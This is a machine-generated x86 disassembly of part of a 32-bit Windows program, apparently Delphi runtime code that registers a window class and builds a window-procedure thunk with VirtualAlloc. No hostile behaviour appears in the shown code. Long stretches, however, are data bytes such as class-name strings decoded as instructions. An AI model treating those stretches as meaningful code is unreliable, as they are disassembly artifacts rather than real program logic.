pop ebx
pop ebp
retn 0xc
sub_41ba70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4144cc
mov edi eax
xor eax eax
push ebp
push sub_41bac5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bacc
mov eax [ rw-data ]
call sub_414530
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414108
call sub_403124
inc esi
dec ebx
jne r-xdata
sub_41bae4
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41bb0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028e0
mov edx sub_41bae4
lea eax [ esi + 0x5 ]
call sub_41bb04
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41bb04
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41bbc8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406984
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41bb0c
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41bc7c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41bba4
sub_41bca4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41bd48
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd4f
retn
mov eax [ rw-data ]
call sub_4138f8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41ba70
xor edx edx
xor eax eax
call sub_417714
mov eax rw-data
call sub_40d1c0
call sub_405cc8
lea eax [ eax + 0xc ]
call sub_40d1c0
mov eax rw-data
call sub_40d1c0
mov eax rw-data
call sub_405598
mov eax sub_41badc
call sub_405434
mov eax rw-data
call sub_40d1c0
call sub_41a310
mov eax rw-data
call sub_40d1c0
mov eax rw-data
call sub_405598
sub_41bd54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41bddd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bde4
retn
call sub_41a2dc
mov eax sub_41badc
call sub_40542c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cf00
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4055b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4131f4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414374
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414374
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41bde8
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebp + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] dh
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] bh
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] ah
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] ch
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] dl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] bl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] al
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] cl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41c0fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c104
retn
sub_41c110
adc al 0xc1
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
je r-xdata
mov [ eax - 0x3fccffb9 ] gs
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c104
retn
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 + 0x41 ] dh
add [ eax + eax ] cl
add [ eax ] al
int3
sub_41c1ed
rol [ ecx ] 0x3
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add ah ch
rol [ ecx ] 0x9
jo r-xdata
jb r-xdata
push 0x65737261
je r-xdata
popa
jne r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
pushad
retn 0x41
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
push es
jo r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
retn 0x41
pop esp
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + eax * 8 + 0x41 ] bl
add [ esi ] al
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pop esp
retn 0x41
popad
jb r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xc2b0c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
or al 0x70
jae r-xdata
jo r-xdata
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
imul esp [ ebx + 0x73 ] 0x41c23490
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
outsb
je r-xdata
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add [ eax ] al
add [ eax ] al
fadd st4
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 8 - 0x3b3bffbf ] bh
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41c33090
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
shr ah 0xc3
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
jo r-xdata
push es
jae r-xdata
popad
insd
nop
inc esp
retn 0x41
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add al ch
retn
dec ebp
jb r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
jb r-xdata
pop es
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
dec ebp
push eax
outsb
insb
pop eax
dec esi
inc esp
outsd
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
in al dx
retn
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
jae r-xdata
jb r-xdata
outsb
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebx * 8 - 0x3c ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
fld [ ecx ]
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
imul esp [ ebx + 0x73 ] 0xc3ecc08b
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ ebx + eax * 8 ] ch
inc ecx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al dh
inc esi
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add [ esp + ebx ] bl
jpe r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
inc esp
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
jb r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
mov al 0xc4
mov ah 0xc5
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x55ffbe3b ] ah
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + esi * 4 - 0x3c ] si
inc ecx
add [ eax + 0x411c ] dl
add [ eax ] cl
inc edi
jb r-xdata
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
outsb
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
push eax
jo r-xdata
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
[ eax ]
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
lds eax [ ecx ]
and al 0x0
add [ eax ] al
les eax [ fs : ecx ]
stosb [ edi ]
jo r-xdata
les eax [ ecx ]
sbb [ eax ] al
add [ eax ] al
sbb al 0x1c
add ah al
insb
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
les eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc40041c4
imul esp [ ebx + 0x73 ] 0x41c4b090
insb
xor eax [ eax ]
js r-xdata
les eax [ ecx ]
imul esp [ ebx + 0x73 ] 0xc08b0000
add al 0xc5
inc ecx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
xor [ eax ] al
add ch bl
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ ebp + ebx * 8 + 0x41 ] al
inc eax
add al bl
imul sp [ ebp + 0x72 ] 0x112c
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
lds eax [ ecx ]
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
jo r-xdata
add [ eax ] al
add ch al
inc ecx
imul esp [ ebx + 0x73 ] 0xffff0001
nop
test ch al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4bffbe3b ] dl
lds eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0xffffffffaa0041c5 ] al
sub_41c244
add [ esp + edx * 2 ] ecx
inc esi
outsd
outsb
je r-xdata
jb r-xdata
push 0x65737261
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
je r-xdata
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
pushad
retn 0x41
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
retn 0x41
pop esp
push ebx
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + eax * 8 + 0x41 ] bl
add [ esi ] al
jae r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xc2b0c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
or al 0x70
jae r-xdata
jo r-xdata
outsd
insb
or [ fs : esi + 0x73 ] ah
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
fadd st4
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 8 - 0x3b3bffbf ] bh
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41c33090
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
shr ah 0xc3
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
push es
jo r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add al ch
retn
dec ebp
jb r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
jb r-xdata
pop es
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ ebx + eax * 8 ] ch
inc ecx
add [ edi ] al
push eax
outsb
insb
pop eax
dec esi
jo r-xdata
inc esp
outsd
inc esp
popad
jae r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
jae r-xdata
outsd
jb r-xdata
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
mov eax eax
in al dx
retn
inc edi
jb r-xdata
jo r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al dh
inc esi
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add [ esp + ebx ] bl
jpe r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
inc esp
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
jb r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
mov al 0xc4
add [ ecx ] al
add ch bh
jae r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
imul esp [ ebx + 0x73 ] 0xc3ecc08b
or [ eax + 0x6d ] esi
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebx * 8 - 0x3c ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
outsb
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
push eax
jo r-xdata
fld [ ecx ]
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
mov ah 0xc5
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x55ffbe3b ] ah
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + esi * 4 - 0x3c ] si
inc ecx
add [ eax + 0x411c ] dl
add [ eax ] cl
inc edi
jb r-xdata
les eax [ ecx ]
sbb [ eax ] al
add [ eax ] al
sbb al 0x1c
add ah al
insb
popad
